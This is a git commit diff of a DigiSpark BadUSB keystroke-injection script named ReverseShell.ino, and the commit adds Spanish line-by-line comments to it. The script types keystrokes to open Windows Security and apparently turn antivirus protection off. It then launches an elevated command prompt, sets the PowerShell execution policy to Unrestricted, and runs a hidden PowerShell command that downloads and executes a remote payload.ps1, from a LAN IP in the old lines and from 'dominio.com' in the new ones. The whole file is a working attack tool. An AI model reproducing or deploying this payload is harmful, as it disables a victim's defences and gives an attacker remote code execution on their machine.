34f3923fee39962f671489820c6fcc167b65c344
Jordi Forés Garcia <73621025+xthalach@users.noreply.github.com>
2022-09-28 19:52:45 +0200

    Update ReverseShell.ino

--- Payload/ReverseShell.ino
+++ Payload/ReverseShell.ino
@@ -6,56 +6,54 @@ void setup() {
 
 void loop() {
   DigiKeyboard.sendKeyStroke(0);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("Antivirus");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("\t");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_SPACE);
-  DigiKeyboard.delay(1000);
-  //DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
-  //DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false");
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
-  //DigiKeyboard.print("powershell \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.131:8000/payload.ps1');\"");
-  DigiKeyboard.print("powershell -WindowStyle hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.131:8000/payload.ps1')\" ");
-  DigiKeyboard.delay(1000);
-  DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(1000); // Esperamos un segundo 
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT); // Tecla Windows para abrir la busqueda 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("Antivirus"); // Buscamos la palabra antivirus
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("\t"); // Tabulamos 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("\t"); // Tabulamos 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("\t"); // Tabulamos 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("\t"); // Tabulamos 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Hacemos un ESPACIO
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // Pusamos la flexa izquierda
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("\t"); // Tabulamos 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Hacemos un ESPACIO
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("\t"); // Tabulamos 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Hacemos un ESPACIO
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Abrimos el ejecutar de Windows 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("powershell Start-Process cmd -Verb runAs"); // Ejecutamos una cmd con privilegios 
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // Pusamos la flexa izquierda
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false"); // Configuramos la politica de ejecución a Unrestricted 
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.print("powershell -WindowStyle hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('http://dominio.com/payload.ps1')\" "); // Llamamos a nuestro payload alojado en el servidor web
+  DigiKeyboard.delay(1000); // Esperamos un segundo
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Hacemos ENTER
+  DigiKeyboard.delay(1000); // Esperamos un segundo
   for (;;) {
     /*empty*/
   }
